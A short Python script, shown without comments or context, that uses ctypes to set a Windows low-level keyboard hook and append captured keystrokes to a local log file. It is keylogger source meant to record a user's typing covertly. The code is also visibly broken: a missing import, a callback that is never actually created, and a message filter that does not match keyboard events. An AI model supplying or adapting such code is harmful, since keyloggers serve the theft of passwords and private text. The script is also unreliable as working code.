```python
import ctypes
import os

user32 = ctypes.WinDLL('user32', use_last_error=True)

def on_keypress(event):
    try:
        with open('logfile.txt', 'ab') as f:
            f.write(bytes([event]))
    except Exception as e:
        print("Error occurred:", str(e))

hook = user32.SetWindowsHookExW(13, ctypes.WINFUNCTYPE(None, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p)), 0, 0)
if hook != 0:
    msg = ctypes.wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
        if msg.message == 255 and msg.wParam == 13:
            on_keypress(msg.lParam)
else:
    print('Failed to set hook')
```